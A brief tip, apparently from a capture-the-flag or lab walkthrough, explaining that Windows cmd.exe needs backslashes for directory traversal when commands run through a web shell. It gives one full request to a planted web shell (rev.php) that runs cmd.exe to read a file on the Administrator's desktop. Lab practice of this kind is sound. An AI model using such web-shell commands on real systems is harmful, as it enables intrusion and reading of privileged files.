
In Windows, certain path traversal methods like `cd ../../` may not work in `cmd.exe`, especially when used through web shells or remote command execution.

✅ Instead of using Unix-style paths, use **Windows-style backslashes (`\`)** for directory traversal.

```
http://10.129.203.7/rev.php?cmd=cmd.exe%20/c%20more%20..\..\Users\Administrator\Desktop\flag.txt
```